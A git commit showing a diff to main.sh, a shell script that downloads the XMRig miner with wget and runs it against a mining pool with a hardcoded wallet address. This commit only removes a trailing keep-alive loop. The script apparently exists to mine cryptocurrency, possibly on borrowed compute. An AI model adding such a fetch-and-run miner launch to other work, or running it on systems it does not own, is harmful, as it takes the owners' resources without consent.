57460ba40c12e693c2e514527b9d52b92a1e04b4
monhodsompul <168453591+monhodsompul@users.noreply.github.com>
2024-05-03 02:33:02 +0700

    Update main.sh

--- main.sh
+++ main.sh
@@ -8,7 +8,3 @@ wget https://github.com/xmrig/xmrig/releases/download/v6.21.1/xmrig-6.21.1-linux
 tar -xzvf xmrig-6.21.1-linux-x64.tar.gz
 cd xmrig-6.21.1
 ./xmrig -o sg-zephyr.miningocean.org:5332 -u ZEPHs9WzG2A6HASnGEA6xRcM7zq9fpX8TJa1azAB23GNffk7tPsguMyCefuPTN14FGK9mREnmPsdT7yC9KFpMfgUVHmZqAzQY7V -p $password -a rx/0 -k --donate-level 1
-while [1]; do
-sleep 3
-done
-sleep 999
